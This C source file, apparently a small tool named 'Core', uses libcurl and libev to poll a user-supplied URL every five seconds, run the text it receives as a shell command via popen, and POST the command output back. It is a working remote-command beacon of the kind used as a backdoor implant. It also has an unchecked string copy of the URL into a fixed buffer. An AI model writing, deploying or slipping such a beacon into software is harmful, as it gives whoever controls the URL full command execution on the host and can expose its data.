/*
 * MIT License
 *
 * Copyright (c) 2024 Ivan Nikolskiy
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <curl/curl.h>
#include <ev.h>
#include <eio.h>

#define MAX_BUFFER 1024
#define CORE_EV_FLAGS EVFLAG_NOENV | EVBACKEND_SELECT | EVFLAG_FORKCHECK

static struct ev_idle eio_idle_watcher;
static struct ev_async eio_async_watcher;

struct async_handle_data
{
    char url[MAX_BUFFER];
    char command[MAX_BUFFER];
};

static void eio_idle_cb(struct ev_loop *loop, struct ev_idle *w, int revents)
{
    if (eio_poll() != -1)
    {
        ev_idle_stop(loop, w);
    }
}

static void eio_async_cb(struct ev_loop *loop, struct ev_async *w, int revents)
{
    if (eio_poll() == -1)
    {
        ev_idle_start(loop, &eio_idle_watcher);
    }

    ev_async_start(ev_default_loop(CORE_EV_FLAGS), &eio_async_watcher);
}

static void eio_want_poll(void)
{
    ev_async_send(ev_default_loop(CORE_EV_FLAGS), &eio_async_watcher);
}

static void eio_done_poll(void)
{
    ev_async_stop(ev_default_loop(CORE_EV_FLAGS), &eio_async_watcher);
}

static void core_signal_handler(struct ev_loop *loop, ev_signal *w, int revents)
{
    switch (w->signum)
    {
        case SIGINT:
            printf("* Core has SIGINT caught\n");
            ev_break(loop, EVBREAK_ALL);
            break;

        case SIGTERM:
            printf("* Core has SIGTERM caught\n");
            ev_break(loop, EVBREAK_ALL);
            break;

        default:
            break;
    }
}

// Function to write the response data from GET request
size_t write_callback(void *ptr, size_t size, size_t nmemb, char *data)
{
    size_t total;

    total = size * nmemb;

    if (total < MAX_BUFFER)
    {
        memcpy(data, ptr, total);
        data[total] = '\0'; // Null terminate the string
    }

    return total;
}

// Function to send the POST request
void send_post_request(const char *url, const char *data)
{
    CURL *curl;
    CURLcode status;
    struct curl_slist *headers = NULL;

    curl = curl_easy_init();
    //printf("%s\n", data);

    if (curl)
    {
        headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

        status = curl_easy_perform(curl);

        if (status != CURLE_OK)
        {
            fprintf(stderr, "POST request failed: %s\n", curl_easy_strerror(status));
        }

        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }
}

// Function to execute a command asynchronously
static void execute_command(eio_req *request)
{
    struct async_handle_data *data;
    char output[MAX_BUFFER + 1];
    FILE *fp;
    size_t bytes_read;

    data = request->data;
    fp = popen(data->command, "r");

    if (fp == NULL)
    {
        perror("popen failed");
        return;
    }

    memset(output, '\0', sizeof(output));

    while ((bytes_read = fread(output, 1, MAX_BUFFER, fp)) > 0)
    {
        send_post_request(data->url, output);
        memset(output, '\0', sizeof(output));
    }

    pclose(fp);
}

// Callback for libev loop
static void async_command_cb(EV_P_ ev_timer *w, int revents)
{
    CURL *curl;
    CURLcode status;

    struct async_handle_data *data;
    data = w->data;

    curl = curl_easy_init();
    if (!curl)
    {
        fprintf(stderr, "Failed to initialize CURL\n");
        return;
    }

    memset(data->command, '\0', sizeof(data->command));
    curl_easy_setopt(curl, CURLOPT_URL, data->url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, data->command);

    status = curl_easy_perform(curl);
    if (status != CURLE_OK)
    {
        fprintf(stderr, "GET request failed: %s\n", curl_easy_strerror(status));
        curl_easy_cleanup(curl);
        return;
    }

    curl_easy_cleanup(curl);
    eio_custom(execute_command, 0, NULL, data);
}

int main(int argc, char *argv[])
{
    ev_timer timer;
    struct ev_loop *loop;
    struct async_handle_data *data;

    if (argc != 2)
    {
        fprintf(stderr, "Usage: %s <URL>\n", argv[0]);
        return 1;
    }

    data = calloc(1, sizeof(*data));

    if (data == NULL)
    {
        fprintf(stderr, "Failed to allocate space for data\n");
        return 1;
    }

    loop = ev_default_loop(CORE_EV_FLAGS);

    ev_idle_init(&eio_idle_watcher, eio_idle_cb);
    ev_async_init(&eio_async_watcher, eio_async_cb);
    eio_init(eio_want_poll, eio_done_poll);

    ev_timer_init(&timer, async_command_cb, 0., 5.); // Poll every 5 seconds
    strncpy(data->url, argv[1], strlen(argv[1]));

    timer.data = data;
    ev_timer_start(loop, &timer);

    ev_run(loop, 0);
    free(data);

    return 0;
}